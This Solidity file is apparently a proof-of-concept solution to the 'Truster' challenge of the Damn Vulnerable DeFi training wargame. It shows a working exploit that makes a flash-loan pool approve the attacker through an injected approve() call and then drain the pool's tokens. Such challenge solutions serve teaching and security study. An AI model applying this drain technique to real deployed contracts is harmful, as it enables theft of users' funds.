// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract Truster_POC {
    function exploit(address target, address token, address player, uint256 amount) external {
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        TrusterLenderPool(target).flashLoan(0, target, token, payload);
        DamnValuableToken(token).transferFrom(target, address(this), amount);
        DamnValuableToken(token).transfer(player, amount);
    }
}